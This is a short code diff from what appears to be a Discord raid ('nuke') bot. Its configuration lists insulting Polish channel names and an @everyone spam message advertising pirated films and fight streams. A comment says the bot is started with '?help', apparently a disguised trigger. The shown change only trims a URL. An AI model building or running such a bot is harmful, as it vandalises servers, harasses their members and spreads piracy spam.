@@ -9,7 +9,7 @@ SPAM_CHANNEL = ["MAMO JAK TO", "TATO ROZJEBALI SERWER", "NO NIE", "TO MOJE LINKI
                 "NIKT NIE MOZE MIEC FILMOW OPROCZ MNIE", "JESTEM", "ODPADEM GENETCZNYM", "NUKED BY RICK ASTLEY",
                 "SZMATO", "YOU ARE RICK ROLLED EZ"]
 
-SPAM_MESSAGE = ["@everyone Zapraszamy na serwer https://discord.gg/movies-city/ Darmowe Filmy oraz Seriale, walki FAME MMA, HIGH LEAGUE, PRIME MMA itd."]
+SPAM_MESSAGE = ["@everyone Zapraszamy na serwer https://discord.gg/movies-city Darmowe Filmy oraz Seriale, walki FAME MMA, HIGH LEAGUE, PRIME MMA itd."]
 
 # Trzeba wpisać "?help" aby włączyć!
 # Trzeba wpisać "?stop" aby wyłączyć!
